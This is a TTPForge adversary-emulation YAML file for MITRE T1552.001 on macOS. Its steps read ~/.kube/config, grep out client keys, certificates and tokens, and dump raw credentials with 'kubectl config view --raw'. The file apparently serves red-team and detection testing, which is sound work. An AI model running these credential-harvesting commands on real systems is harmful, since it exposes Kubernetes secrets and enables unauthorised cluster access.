---
api_version: 2.0
uuid: 4fbce943-f525-4148-888c-7d10890e90fb
name: Kubernetes Config Access
authors:
- TTPForge
description: |
  Access and extract Kubernetes configuration files and credentials
mitre:
  tactics:
  - TA0006 Credential Access
  techniques:
  - T1552 Unsecured Credentials
  subtechniques:
  - 'T1552.001 Unsecured Credentials: Credentials In Files'
requirements:
  platforms:
  - os: darwin
args:
- name: kubeconfig_paths
  description: Paths to kubeconfig files
  type: string
  default: ~/.kube/config:/etc/kubernetes/admin.conf
- name: output_file
  description: File to store extracted Kubernetes config
  type: string
  default: /tmp/kubeconfig_extract.txt
steps:
- name: Check Kubeconfig Location
  inline: test -f ~/.kube/config && echo 'Kubeconfig found' || echo 'Kubeconfig not found'
- name: Read Kubeconfig
  inline: cat ~/.kube/config 2>/dev/null | grep -E 'certificate-authority-data|client-certificate-data|client-key-data|token'
    | head -30 || echo 'Kubeconfig not accessible'
- name: Query Cluster Information
  inline: kubectl config view --raw 2>/dev/null || echo 'kubectl not available'
- name: List Kubernetes Contexts
  inline: kubectl config get-contexts 2>/dev/null || echo 'No contexts available'
  cleanup:
    inline: rm -f {{ .Args.output_file }}
tests:
- name: dry_run_test
  dry_run: true
